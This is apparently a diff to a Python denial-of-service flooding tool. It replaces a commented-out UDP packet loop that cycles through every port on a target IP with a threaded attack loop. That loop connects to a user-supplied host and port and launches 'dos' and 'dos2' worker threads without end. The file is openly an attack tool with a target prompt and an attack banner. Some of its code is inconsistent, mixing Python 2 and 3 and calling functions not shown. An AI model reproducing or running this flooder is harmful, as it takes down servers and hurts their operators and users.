@@ -27,24 +27,48 @@ print "Facebook : https://www.facebook.com/ALAlamy.Tube"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
-
-os.system("clear")
-os.system("figlet Attack Starting")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
 sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+#while True:
+#     sock.sendto(bytes, (ip,port))
+#     sent = sent + 1
+#    port = port + 1
+#    print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+#     if port == 65534:
+#       port = 1
+
+if __name__ == '__main__':
+	if len(sys.argv) < 2:
+		usage()
+	get_parameters()
+	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
+	print("\033[94mPlease wait...\033[0m")
+	user_agent()
+	my_bots()
+	time.sleep(5)
+	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host,int(port)))
+		s.settimeout(1)
+	except socket.error as e:
+		print("\033[91mcheck server ip and port\033[0m")
+		usage()
+	while True:
+		for i in range(int(thr)):
+			t = threading.Thread(target=dos)
+			t.daemon = True  # if thread is exist, it dies
+			t.start()
+			t2 = threading.Thread(target=dos2)
+			t2.daemon = True  # if thread is exist, it dies
+			t2.start()
+		start = time.time()
+		#tasking
+		item = 0
+		while True:
+			if (item>1800): # for no memory crash
+				item=0
+				time.sleep(.1)
+			item = item + 1
+			q.put(item)
+			w.put(item)
+		q.join()
+		w.join()
